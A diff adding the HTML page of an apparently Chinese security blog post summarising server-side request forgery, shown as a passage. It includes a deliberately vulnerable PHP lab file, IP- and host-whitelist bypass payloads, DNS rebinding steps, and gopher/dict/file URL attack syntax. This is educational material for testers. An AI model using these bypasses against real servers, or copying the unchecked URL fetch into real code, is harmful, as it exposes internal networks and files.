@@ -1,0 +1,2609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Sariel.D">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Sariel.D">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="基础总结(-:-)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF 小结">
+<meta property="og:url" content="https://blog.sari3l.com/posts/85fdfb64/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="基础总结(-:-)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+<meta property="article:published_time" content="2019-07-16T12:20:35.000Z">
+<meta property="article:modified_time" content="2020-07-06T09:45:09.545Z">
+<meta property="article:author" content="Sariel.D">
+<meta property="article:tag" content="SSRF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <link rel="alternate" href="/atom.xml" title="Learning Man&#39;s Blog" type="application/atom+xml">
+    
+    <title>SSRF 小结 · Learning Man</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/css/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io@latest/scripts/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-129685149-2', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-funky.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Learning Man&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">SSRF 小结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Learning Man's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            SSRF 小结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SSRF">SSRF</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/07/16</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <!--<img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        -->
+        <img class="loading" src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>先上一张老图:3</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15625569437965.jpg" alt></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol>
+<li><p>kali 设置 nginx + php</p>
+<pre class=" language-plain"><code class="language-plain"> # /etc/nginx/sites-enabled/default
+ location ~ \.php$ {
+     include snippets/fastcgi-php.conf;
+     # With php-fpm (or other unix sockets):
+     fastcgi_pass unix:/run/php/php7.3-fpm.sock;
+     # With php-cgi (or other tcp sockets):
+ #   fastcgi_pass 127.0.0.1:9000;
+ }</code></pre>
+</li>
+<li><p>添加 ssrf 文件</p>
+<pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>
+     <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+     <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+     <span class="token shell-comment comment"># curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
+     <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+     <span class="token shell-comment comment"># curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
+     <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+     <span class="token shell-comment comment"># $output = curl_exec($ch);</span>
+     <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+ <span class="token delimiter">?></span></code></pre>
+</li>
+</ol>
+<h2 id="0x00-验证方法"><a href="#0x00-验证方法" class="headerlink" title="0x00 验证方法"></a>0x00 验证方法</h2><pre class=" language-url"><code class="language-url">http://baidu.com/?url=&#x3c;ssrf></code></pre>
+<ol>
+<li>F12 查看 network 是否由服务端发起请求</li>
+<li>利用 Dnslog 等记录查看请求来源</li>
+<li>修改访问端口查看返回内容</li>
+<li>盲打 SSRF (gopher)注意不加 quit 返回时间</li>
+</ol>
+<h2 id="0x01-常见攻击方式"><a href="#0x01-常见攻击方式" class="headerlink" title="0x01 常见攻击方式"></a>0x01 常见攻击方式</h2><ol>
+<li>RCE<ol>
+<li>gopher:// 配合 TCP 流打 payload</li>
+<li>http:// 打 RCE，包括不限于 struts2</li>
+</ol>
+</li>
+<li>file://读文件、phar://协议反序列化、gopher:// &amp; tcp 读应用内数据、请求（如：邮件伪造）</li>
+<li>探测内网IP、Port、Service</li>
+<li>内网代理</li>
+</ol>
+<h2 id="0x02-常用工具"><a href="#0x02-常用工具" class="headerlink" title="0x02 常用工具"></a>0x02 常用工具</h2><ul>
+<li>SSRFmap：<a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noopener">https://github.com/swisskyrepo/SSRFmap</a></li>
+<li>Gopherus：<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a> </li>
+<li>SSRF_Proxy：<a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">https://github.com/bcoles/ssrf_proxy</a>   </li>
+</ul>
+<h3 id="盲打"><a href="#盲打" class="headerlink" title="盲打"></a>盲打</h3><ol>
+<li><code>quit</code>：发送时候不携带 quit 则会一直保持连接，所以分两次执行简单命令，看携带、不携带 quit 时间差异是不是很明显</li>
+<li>命令执行：配合比如 dnslog 或者其他记录</li>
+</ol>
+<h2 id="0x03-常见绕过姿势"><a href="#0x03-常见绕过姿势" class="headerlink" title="0x03 常见绕过姿势"></a>0x03 常见绕过姿势</h2><p>主要聚焦在 IP、Host 白名单绕过</p>
+<h3 id="i-IP-格式"><a href="#i-IP-格式" class="headerlink" title="i. IP 格式"></a>i. IP 格式</h3><p>192.168.0.1</p>
+<ol>
+<li>8进制格式：0300.0250.0.1</li>
+<li>16进制格式：0xC0.0xA8.0.1</li>
+<li>10进制整数格式：3232235521</li>
+<li>16进制整数格式：0xC0A80001</li>
+</ol>
+<p>还有一种特殊的省略模式，例如10.0.0.1这个IP可以写成10.1</p>
+<ol>
+<li><a href="http://0/" target="_blank" rel="noopener">http://0/</a></li>
+<li><a href="http://127.1/" target="_blank" rel="noopener">http://127.1/</a></li>
+<li>利用ipv6绕过，http://[::1]/</li>
+<li><a href="http://127.0.0.1./" target="_blank" rel="noopener">http://127.0.0.1./</a></li>
+</ol>
+<h3 id="ii-不一致性"><a href="#ii-不一致性" class="headerlink" title="ii. 不一致性"></a>ii. 不一致性</h3><ol>
+<li>主要体现在 URI 语法的解读上</li>
+</ol>
+<pre class=" language-plain"><code class="language-plain">http://www.qq.com.sari3l.com
+http://www.qq.com@sari3l.com
+http://sari3l.com#www.qq.com
+...</code></pre>
+<h3 id="iii-特殊字符"><a href="#iii-特殊字符" class="headerlink" title="iii. 特殊字符"></a>iii. 特殊字符</h3><pre class=" language-plain"><code class="language-plain">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+
+List:
+① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre>
+<h3 id="iv-302-Redirect"><a href="#iv-302-Redirect" class="headerlink" title="iv. 302 Redirect"></a>iv. 302 Redirect</h3><ul>
+<li><a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io/</a></li>
+<li><a href="https://nip.io/" target="_blank" rel="noopener">https://nip.io/</a></li>
+</ul>
+<pre class=" language-plain"><code class="language-plain">127.0.0.1.xip.io -> 127.0.0.1
+www.127.0.0.1.xip.io -> 127.0.0.1</code></pre>
+<h3 id="v-DNS-Rebinding"><a href="#v-DNS-Rebinding" class="headerlink" title="v. DNS Rebinding"></a>v. DNS Rebinding</h3><p>DNS重绑定可以利用于ssrf绕过 ，bypass 同源策略等</p>
+<p>我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。</p>
+<ol>
+<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
+<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
+<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</li>
+<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
+</ol>
+<h2 id="0x04-常用协议"><a href="#0x04-常用协议" class="headerlink" title="0x04 常用协议"></a>0x04 常用协议</h2><h3 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher://"></a>Gopher://</h3><p>查了很多资料，Gopher 的详细解析基本已经消失了，只留下 <a href="https://tools.ietf.org/html/rfc4266" target="_blank" rel="noopener">RFC 文件</a> 以及 <a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" target="_blank" rel="noopener">wiki</a> 有比较详细的说明</p>
+<p><strong>但实际用起来感觉对<code>&lt;gopher-path&gt;</code>的解析存在疑问</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622185144741.jpg" alt="-w592"></p>
+<h4 id="Url-Syntax"><a href="#Url-Syntax" class="headerlink" title="Url Syntax"></a>Url Syntax</h4><p>目前网上大致都是如下 URL 格式：</p>
+<pre class=" language-plain"><code class="language-plain">URL:gopher://&#x3c;host>:&#x3c;port>/_payload</code></pre>
+<p>需要注意的点：</p>
+<ul>
+<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
+<li><code>空白行</code>替换为<code>%0a</code></li>
+<li><code>空格</code>替换成<code>%20</code></li>
+<li>urlencode(视情况)</li>
+</ul>
+<hr>
+<p>然而在实际测试中，基本如下：</p>
+<pre class=" language-plain"><code class="language-plain">URL:gopher://&#x3c;host>:&#x3c;port>/&#x3c;single-char>&#x3c;tcp-stream></code></pre>
+<ul>
+<li>single-char：任意单个字符</li>
+<li>tcp-stream：tcp 流数据</li>
+</ul>
+<p>需要注意的点：</p>
+<ul>
+<li>将<code>\r\n</code>字符串替换成<code>%0d%0a</code>（注：<code>\n</code>不可见）</li>
+<li><code>空白行</code>替换为<code>%0a</code></li>
+<li><code>空格</code>替换成<code>%09</code>或<code>%20</code></li>
+<li>最后的<code>quit</code>可以不用跟换行</li>
+<li><code>get</code>、<code>set</code>命令允许将<code>\r\n</code>替换为<code>%0a</code></li>
+<li>如果直接打 gopher 协议，还需将<code>$</code>编码为<code>%24</code></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622201979090.jpg" alt></p>
+<h4 id="Tcp-Stream"><a href="#Tcp-Stream" class="headerlink" title="Tcp Stream"></a>Tcp Stream</h4><p>为什么在<code>&lt;single-char&gt;</code>后能填充 payload？<br>相关内容并没有在网上直接看到，但是通过 wireshark 抓包可以看到这部分在数据包中位置是 Tcp payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622209666232.jpg" alt="-w622"></p>
+<p>跟一下 tcp 流</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622212028999.jpg" alt="-w786"></p>
+<p><strong>通过这一点，就可以拿来配合各种常见应用操作对应的 tcp 数据流进行攻击了</strong></p>
+<h4 id="HTTP-Method"><a href="#HTTP-Method" class="headerlink" title="HTTP Method"></a>HTTP Method</h4><p>各种 method 利用方式基本一致，下面以 POST 为例</p>
+<pre class=" language-shell"><code class="language-shell">> curl -v "gopher://127.0.0.1:8080/^POST / HTTP/1.1%0d%0a"</code></pre>
+<p>和直接发送 HTTP 数据包不同，Gopher 下请求 POST ，可以看到会在三次握手后发送一个 <a href="https://blog.csdn.net/q1007729991/article/details/70154359" target="_blank" rel="noopener">PSH 标志</a>，表明缓冲区内有数据需要发送，可以在流量中看到，在得到服务端响应后构造 HTTP 数据包再发送</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15624814559979.jpg" alt="-w1334"></p>
+<h3 id="Dict"><a href="#Dict" class="headerlink" title="Dict://"></a>Dict://</h3><p>RFC：<a href="https://tools.ietf.org/html/rfc2229" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc2229</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622227498106.jpg" alt="-w601"></p>
+<h4 id="Url-Syntax-1"><a href="#Url-Syntax-1" class="headerlink" title="Url Syntax"></a>Url Syntax</h4><p>在不需要认证的情况下，可以直接使用以下命令</p>
+<pre class=" language-plain"><code class="language-plain">URL:dict://&#x3c;host>:&#x3c;port>/&#x3c;command>:&#x3c;data1>:&#x3c;data2>[:&#x3c;dataN>]</code></pre>
+<p><strong>简单的说，就是只能执行一条(行)命令</strong></p>
+<p>注意到下图中为什么还返回了一个<code>+OK</code>？<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622232923454.jpg" alt></p>
+<p>实际上是 dict 自己在末尾加了<code>%0d%0aQUIT%0d%0a</code>退出命令</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/85fdfb64/2019-07-16-15622234256062.jpg" alt="-w606"></p>
+<h3 id="File"><a href="#File" class="headerlink" title="File://"></a>File://</h3><p>读文件</p>
+<pre class=" language-plain"><code class="language-plain">Url:file://&#x3c;path>
+Url:file://&#x3c;host>/&#x3c;path>    # 不能加端口</code></pre>
+<h3 id="HTTP-s"><a href="#HTTP-s" class="headerlink" title="HTTP(s)://"></a>HTTP(s)://</h3><p>需要有 crlf 漏洞解析<code>%0d%0a</code>，但同时注意会因为多余的内容(headers)产生报错</p>
+<p>很少碰到案例，放一张老图</p>
